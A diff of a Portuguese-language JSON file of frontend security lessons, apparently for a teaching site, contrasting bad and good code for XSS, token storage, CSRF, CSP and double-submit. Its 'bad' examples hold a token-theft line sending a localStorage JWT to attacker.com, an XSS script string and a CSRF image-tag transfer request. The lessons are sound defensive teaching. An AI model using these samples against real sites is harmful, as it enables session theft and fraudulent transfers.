@@ -1,94 +1,94 @@
 {
   "inputValidation": {
-    "title": "Input Validation",
-    "description": "Valide tudo que vem do usuário. Não confie em ninguém.",
+    "title": "Input Validation (Zod + React Hook Form)",
+    "description": "Valide tudo que vem do usuário no frontend. Isso é UX, não segurança — o backend valida de verdade.",
     "bad": {
-      "title": "❌ RUIM - Confiando no usuário",
+      "title": "❌ RUIM - Sem validação",
       "code": "// ❌ RUIM - Confiando no usuário\nconst handleSubmit = (data) => {\n  // Usuário pode enviar qualquer coisa\n  fetch('/api/users', {\n    method: 'POST',\n    body: JSON.stringify(data) // Sem validação\n  });\n};"
     },
     "good": {
-      "title": "✅ BOM - Validando tudo",
-      "code": "// ✅ BOM - Validando tudo\nconst handleSubmit = (data) => {\n  const schema = z.object({\n    email: z.string().email(),\n    password: z.string().min(8),\n    name: z.string().min(2).max(50)\n  });\n  \n  const validated = schema.parse(data);\n  fetch('/api/users', {\n    method: 'POST',\n    body: JSON.stringify(validated)\n  });\n};"
+      "title": "✅ BOM - Zod + React Hook Form",
+      "code": "// ✅ BOM - Schema validation com Zod\nimport { z } from 'zod';\nimport { useForm } from 'react-hook-form';\nimport { zodResolver } from '@hookform/resolvers/zod';\n\nconst schema = z.object({\n  email: z.string().email('Email inválido'),\n  password: z.string().min(8, 'Mínimo 8 caracteres'),\n  name: z.string().min(2).max(50),\n});\n\ntype FormData = z.infer<typeof schema>;\n\nfunction RegisterForm() {\n  const { register, handleSubmit, formState: { errors } } = useForm<FormData>({\n    resolver: zodResolver(schema),\n  });\n\n  const onSubmit = (data: FormData) => {\n    // data já está validado e tipado\n    api.post('/users', data);\n  };\n\n  return <form onSubmit={handleSubmit(onSubmit)}>...</form>;\n}\n\n// ⚠️ Lembre: validação no frontend é UX.\n// O backend DEVE validar novamente."
     }
   },
   "xssPrevention": {
     "title": "XSS Prevention",
-    "description": "Nunca renderize HTML do usuário sem sanitizar.",
+    "description": "React já escapa JSX por padrão. O perigo é dangerouslySetInnerHTML.",
     "bad": {
       "title": "❌ RUIM - XSS vulnerável",
-      "code": "// ❌ RUIM - XSS vulnerável\nconst Comment = ({ content }) => (\n  <div dangerouslySetInnerHTML={{ __html: content }} />\n);"
+      "code": "// ❌ RUIM - XSS vulnerável\nconst Comment = ({ content }) => (\n  <div dangerouslySetInnerHTML={{ __html: content }} />\n  // Se content = '<script>alert(1)</script>' → XSS!\n);"
     },
     "good": {
-      "title": "✅ BOM - Sanitizado",
-      "code": "// ✅ BOM - Sanitizado\nimport DOMPurify from 'dompurify';\n\nconst Comment = ({ content }) => (\n  <div dangerouslySetInnerHTML={{ \n    __html: DOMPurify.sanitize(content) \n  }} />\n);"
+      "title": "✅ BOM - DOMPurify quando HTML é necessário",
+      "code": "// ✅ BOM - Sanitizado com DOMPurify\nimport DOMPurify from 'dompurify';\n\nconst RichContent = ({ html }: { html: string }) => (\n  <div dangerouslySetInnerHTML={{\n    __html: DOMPurify.sanitize(html, {\n      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],\n      ALLOWED_ATTR: ['href', 'target', 'rel'],\n    })\n  }} />\n);"
     },
     "better": {
-      "title": "✅ MELHOR - Sem HTML",
-      "code": "// ✅ MELHOR - Sem HTML\nconst Comment = ({ content }) => (\n  <div>{content}</div> // Texto puro\n);"
+      "title": "✅ MELHOR - Evite HTML, use Markdown",
+      "code": "// ✅ MELHOR - Markdown em vez de HTML\nimport ReactMarkdown from 'react-markdown';\n\nconst Comment = ({ content }: { content: string }) => (\n  <ReactMarkdown\n    allowedElements={['p', 'strong', 'em', 'a', 'code']}\n    components={{\n      a: ({ href, children }) => (\n        <a href={href} target=\"_blank\" rel=\"noopener noreferrer\">\n          {children}\n        </a>\n      ),\n    }}\n  >\n    {content}\n  </ReactMarkdown>\n);"
     }
   },
   "secureStorage": {
-    "title": "Secure Storage",
-    "description": "Dados sensíveis não ficam no localStorage.",
+    "title": "Token Storage",
+    "description": "Onde guardar tokens no frontend? Cada opção tem trade-offs reais.",
     "bad": {
-      "title": "❌ RUIM - Dados sensíveis no localStorage",
-      "code": "// ❌ RUIM - Dados sensíveis no localStorage\nlocalStorage.setItem('token', 'jwt-token');\nlocalStorage.setItem('user', JSON.stringify(userData));"
+      "title": "❌ RUIM - JWT no localStorage",
+      "code": "// ❌ RUIM - JWT no localStorage\n// Acessível por qualquer script (XSS = game over)\nlocalStorage.setItem('token', jwt);\n\n// Qualquer XSS pode fazer:\nconst token = localStorage.getItem('token');\nfetch('https://attacker.com/steal?t=' + token);"
     },
     "good": {
-      "title": "✅ BOM - HttpOnly cookies + sessionStorage",
-      "code": "// ✅ BOM - HttpOnly cookies + sessionStorage\n// Backend: Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict\n// Frontend: sessionStorage só para dados não sensíveis\nsessionStorage.setItem('theme', 'dark');\nsessionStorage.setItem('language', 'pt-BR');"
+      "title": "✅ BOM - HttpOnly cookies (gerenciado pelo backend)",
+      "code": "// ✅ BOM - HttpOnly cookies\n// Backend configura:\n// Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict; Path=/\n\n// Frontend: não precisa gerenciar token!\n// O cookie vai automaticamente em cada request\nconst response = await fetch('/api/me', {\n  credentials: 'include', // Envia cookies\n});\n\n// ⚠️ Trade-off: precisa de CSRF protection\n// SameSite=Strict mitiga, mas não elimina"
     },
     "better": {
-      "title": "✅ MELHOR - Memory storage para dados sensíveis",
-      "code": "// ✅ MELHOR - Memory storage para dados sensíveis\nconst authStore = {\n  token: null,\n  setToken(token) {\n    this.token = token; // Só em memória\n  },\n  getToken() {\n    return this.token;\n  }\n};"
+      "title": "✅ Em memória (SPAs com refresh token rotation)",
+      "code": "// ✅ Token em memória + refresh via cookie\nlet accessToken: string | null = null;\n\n// Access token fica só em memória (morre com a tab)\nexport const auth = {\n  setToken: (token: string) => { accessToken = token; },\n  getToken: () => accessToken,\n  clear: () => { accessToken = null; },\n};\n\n// Refresh token em HttpOnly cookie (gerenciado pelo backend)\n// Na inicialização do app:\nasync function initAuth() {\n  const res = await fetch('/api/auth/refresh', { credentials: 'include' });\n  if (res.ok) {\n    const { accessToken } = await res.json();\n    auth.setToken(accessToken);\n  }\n}"
     }
   },
-  "corsConfiguration": {
-    "title": "CORS Configuration",
-    "description": "Configure CORS corretamente. Não seja permissivo.",
+  "csrfProtection": {
+    "title": "CSRF Protection",
+    "description": "Se você usa cookies para auth, precisa de CSRF protection.",
     "bad": {
-      "title": "❌ RUIM - CORS permissivo",
-      "code": "// ❌ RUIM - CORS permissivo\napp.use(cors()); // Permite qualquer origem"
+      "title": "❌ RUIM - Sem proteção CSRF",
+      "code": "// ❌ RUIM - Cookie auth sem CSRF\n// Um site malicioso pode fazer:\n// <img src=\"https://seuapp.com/api/transfer?to=attacker&amount=1000\">\n// O browser envia os cookies automaticamente!"
     },
     "good": {
-      "title": "✅ BOM - CORS restritivo",
-      "code": "// ✅ BOM - CORS restritivo\napp.use(cors({\n  origin: ['https://meuapp.com', 'https://admin.meuapp.com'],\n  credentials: true,\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization']\n}));"
+      "title": "✅ BOM - CSRF token em header",
+      "code": "// ✅ BOM - CSRF token\n// 1. Backend envia CSRF token em cookie não-HttpOnly\n// 2. Frontend lê e envia no header de cada mutação\n\nfunction getCsrfToken(): string {\n  return document.cookie\n    .split('; ')\n    .find(c => c.startsWith('csrf-token='))\n    ?.split('=')[1] ?? '';\n}\n\nconst apiClient = {\n  post: (url: string, data: unknown) =>\n    fetch(url, {\n      method: 'POST',\n      credentials: 'include',\n      headers: {\n        'Content-Type': 'application/json',\n        'X-CSRF-Token': getCsrfToken(),\n      },\n      body: JSON.stringify(data),\n    }),\n};"
     },
     "better": {
-      "title": "✅ MELHOR - Environment-based",
-      "code": "// ✅ MELHOR - Environment-based\napp.use(cors({\n  origin: process.env.ALLOWED_ORIGINS?.split(',') || [],\n  credentials: true\n}));"
+      "title": "✅ MELHOR - SameSite=Strict + Custom header",
+      "code": "// ✅ MELHOR - Double Submit Cookie pattern\n// SameSite=Strict já previne a maioria dos ataques CSRF\n// Combine com um custom header que sites externos não podem setar\n\nconst api = {\n  mutate: (url: string, data: unknown) =>\n    fetch(url, {\n      method: 'POST',\n      credentials: 'include',\n      headers: {\n        'Content-Type': 'application/json',\n        'X-Requested-With': 'XMLHttpRequest', // Custom header\n      },\n      body: JSON.stringify(data),\n    }),\n};\n\n// Backend valida:\n// 1. Cookie SameSite=Strict (browser enforces origin)\n// 2. Header X-Requested-With presente (CORS preflight blocks cross-origin)"
     }
   },
   "securityHeaders": {
-    "title": "Security Headers",
-    "description": "Configure headers de segurança no servidor.",
+    "title": "Content Security Policy (CSP)",
+    "description": "CSP limita o que seu site pode carregar. Configure no servidor ou em meta tags.",
     "bad": {
-      "title": "❌ RUIM - Sem headers de segurança",
-      "code": "// ❌ RUIM - Sem headers de segurança\n// Servidor não envia headers de proteção"
+      "title": "❌ RUIM - CSP com unsafe-inline",
+      "code": "// ❌ RUIM - CSP que não protege nada\n// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'\n//\n// unsafe-inline: permite <script>alert(1)</script> → XSS!\n// unsafe-eval: permite eval('malicious code') → RCE!"
     },
     "good": {
-      "title": "✅ BOM - Headers básicos",
-      "code": "// ✅ BOM - Headers básicos\napp.use(helmet());\n\n// Headers configurados:\n// - X-Frame-Options: DENY\n// - X-Content-Type-Options: nosniff\n// - X-XSS-Protection: 1; mode=block\n// - Strict-Transport-Security: max-age=31536000"
+      "title": "✅ BOM - CSP com nonce (Next.js / frameworks SSR)",
+      "code": "// ✅ BOM - CSP com nonce para inline scripts\n// O framework gera um nonce único por request\n//\n// Header:\n// Content-Security-Policy:\n//   default-src 'self';\n//   script-src 'self' 'nonce-abc123';\n//   style-src 'self' 'nonce-abc123';\n//   img-src 'self' data: https:;\n//   connect-src 'self' https://api.meuapp.com;\n//   frame-src 'none';\n//   object-src 'none';\n\n// Next.js: next.config.js\nconst cspHeader = `\n  default-src 'self';\n  script-src 'self' 'nonce-${nonce}';\n  style-src 'self' 'nonce-${nonce}';\n`;"
     },
     "better": {
-      "title": "✅ MELHOR - CSP personalizado",
-      "code": "// ✅ MELHOR - CSP personalizado\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", \"'unsafe-inline'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"data:\", \"https:\"],\n      connectSrc: [\"'self'\"],\n      fontSrc: [\"'self'\"],\n      objectSrc: [\"'none'\"],\n      mediaSrc: [\"'self'\"],\n      frameSrc: [\"'none'\"]\n    }\n  }\n}));"
+      "title": "✅ Para SPAs (Vite/CRA) - meta tag",
+      "code": "<!-- index.html -->\n<meta http-equiv=\"Content-Security-Policy\" content=\"\n  default-src 'self';\n  script-src 'self';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https:;\n  connect-src 'self' https://api.meuapp.com;\n  font-src 'self';\n  object-src 'none';\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n\">\n\n<!-- ⚠️ style-src unsafe-inline é necessário para\n     CSS-in-JS (Mantine, styled-components, Emotion).\n     Para CSS modules/Tailwind, pode remover. -->"
     }
   },
   "rateLimiting": {
-    "title": "Rate Limiting",
-    "description": "Proteja suas APIs contra abuso.",
+    "title": "Frontend Rate Limiting & Abuse Prevention",
+    "description": "O frontend não faz rate limiting real (isso é do backend), mas pode prevenir abuso na UI.",
     "bad": {
-      "title": "❌ RUIM - Sem rate limiting",
-      "code": "// ❌ RUIM - Sem rate limiting\napp.post('/api/login', (req, res) => {\n  // Usuário pode tentar quantas vezes quiser\n  authenticateUser(req.body);\n});"
+      "title": "❌ RUIM - Submit sem proteção",
+      "code": "// ❌ RUIM - Botão que pode ser clicado N vezes\nfunction TransferForm() {\n  const handleSubmit = () => {\n    fetch('/api/transfer', { method: 'POST', body: data });\n    // Usuário pode clicar 10x e transferir 10x!\n  };\n  return <button onClick={handleSubmit}>Transferir</button>;\n}"
     },
     "good": {
-      "title": "✅ BOM - Rate limiting básico",
-      "code": "// ✅ BOM - Rate limiting básico\nimport rateLimit from 'express-rate-limit';\n\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutos\n  max: 5, // 5 tentativas\n  message: 'Muitas tentativas de login. Tente novamente em 15 minutos.'\n});\n\napp.post('/api/login', loginLimiter, (req, res) => {\n  authenticateUser(req.body);\n});"
+      "title": "✅ BOM - Debounce + loading state",
+      "code": "// ✅ BOM - Proteção contra double-submit\nfunction TransferForm() {\n  const mutation = useMutation({\n    mutationFn: (data: TransferData) =>\n      api.post('/transfer', data),\n  });\n\n  return (\n    <button\n      onClick={() => mutation.mutate(data)}\n      disabled={mutation.isPending} // Desabilita durante request\n    >\n      {mutation.isPending ? 'Processando...' : 'Transferir'}\n    </button>\n  );\n}"
     },
     "better": {
-      "title": "✅ MELHOR - Rate limiting por IP e rota",
-      "code": "// ✅ MELHOR - Rate limiting por IP e rota\nconst apiLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100, // 100 requests por IP\n  message: 'Muitas requisições. Tente novamente mais tarde.'\n});\n\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  skipSuccessfulRequests: true,\n  message: 'Muitas tentativas de login.'\n});\n\napp.use('/api/', apiLimiter);\napp.use('/api/auth/', authLimiter);"
+      "title": "✅ MELHOR - Idempotency key",
+      "code": "// ✅ MELHOR - Idempotency key previne duplicação\nimport { v4 as uuid } from 'uuid';\n\nfunction TransferForm() {\n  const [idempotencyKey] = useState(() => uuid());\n\n  const mutation = useMutation({\n    mutationFn: (data: TransferData) =>\n      api.post('/transfer', data, {\n        headers: { 'Idempotency-Key': idempotencyKey },\n      }),\n  });\n\n  // Mesmo se o request for enviado 2x, o backend\n  // identifica pelo idempotency key e executa só 1x\n  return (\n    <button\n      onClick={() => mutation.mutate(data)}\n      disabled={mutation.isPending}\n    >\n      Transferir\n    </button>\n  );\n}"
     }
   }
 }
